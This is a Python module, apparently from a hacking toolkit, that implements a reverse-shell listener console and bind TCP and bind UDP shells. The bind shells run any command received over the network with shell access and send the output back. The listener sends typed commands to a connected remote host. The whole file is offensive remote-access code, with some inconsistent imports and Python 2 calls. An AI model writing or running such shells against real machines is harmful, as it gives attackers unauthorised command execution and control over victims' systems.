import socket
import threading
import os
import sys
from mods import a_main
from subprocess import Popen, PIPE
import socket,os
from socket import socket, AF_INET, SOCK_DGRAM

def liste():
    print('  Reverse Shell Console')
    def send_commands(conn):
        while True:
            cmd = input()
            if cmd == 'quit':
                conn.close()
                server.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")
            if cmd == 'help':
                lss = ['Help\n', 'quit - Exit the program']
                for i in lss:
                    print(i)

    bind_ip = input('  set localhost ip> ')
    print('  [\033[1;32mOK\033[0;0m] - Local Ip ', bind_ip)
    bind_port = int(input('  Set port> '))
    print('  [\033[1;32mOK\033[0;0m] - Local Port: ', bind_port)
    serv_add = (bind_ip, bind_port)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((serv_add))
    server.listen(5)
    print("  [\033[1;32mOK\033[0;0m]-Listening on {}:{}".format(bind_ip, bind_port))
    conn, addr = server.accept()
    print('  accepted connection from {} and port {}'.format(addr[0], addr[1]))
    print("  enter the commands below\ntype help")
    send_commands(conn)
    conn.close()
    input('press enter')
    a_main()

def bindtcp():
    print('  Bind TCP ')
    try:
        port = int(input('  Set Port> '))
    except:
        a_main.a_main()

    so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    so.bind(('0.0.0.0',port))
    so.listen(1)
    so,addr=so.accept()
    x=False
    while not x:
        data=so.recv(1024)
        stdin,stdout,stderr,=os.popen3(data)
        stdout_value=stdout.read()+stderr.read()
        so.send(stdout_value)

def bindudp():
    print('  Bind UDP')
    try:
        port = int(input('  Set Port> '))
    except:
        a_main.a_main()
    s=socket(AF_INET,SOCK_DGRAM)
    s.bind(('0.0.0.0',port))
    while 1:
        data,addr=s.recvfrom(1024)
        out=Popen(data,shell=True,stdout=PIPE,stderr=PIPE).communicate()
        s.sendto(''.join([out[0],out[1]]),addr)



